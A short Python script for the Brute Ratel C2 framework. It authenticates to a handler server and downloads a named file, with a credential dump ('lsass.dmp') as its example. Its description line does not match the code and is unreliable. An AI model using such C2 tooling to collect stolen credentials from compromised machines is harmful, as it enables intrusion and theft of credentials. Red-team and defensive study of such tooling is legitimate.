import argparse
import asyncio
import bruteratel

async def main():
    parser = argparse.ArgumentParser(
        description="Adds a tcp/smb/http/doh/dns badger profile for payload generation",
        epilog="Example:\n python3 api_download_file.py -user ninja -password pass@123 -handler 172.16.219.1:8443 -filename lsass.dmp",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument('-user',     type=str, required=True, help="api server username", metavar='')
    parser.add_argument('-password', type=str, required=True, help="api server password", metavar='')
    parser.add_argument('-handler',  type=str, required=True, help="api server handler host and port. Eg: 127.0.0.1:8443", metavar='')
    parser.add_argument('-filename', type=str, required=True, help="file name to download from the server", metavar='')
    args = parser.parse_args()

    wsClient = await bruteratel.br_connect_handler(args.user, args.password, args.handler)
    print("[+] Authentication success")

    fileBuffer = await bruteratel.br_download_file(wsClient, args.filename)
    if fileBuffer is not None:
        fileBufferLen = len(fileBuffer)
        print(f"[+] Downloaded fileBuffer of {fileBufferLen} bytes")
        fileIO = open(args.filename, "wb")
        bytesWritten = fileIO.write(fileBuffer)
        fileIO.close()
        print("[+] Wrote %d bytes to disk" % bytesWritten)
    else:
        print("[-] Error downloading file")

    await wsClient.close(1000)

if __name__ == "__main__":
    asyncio.run(main())
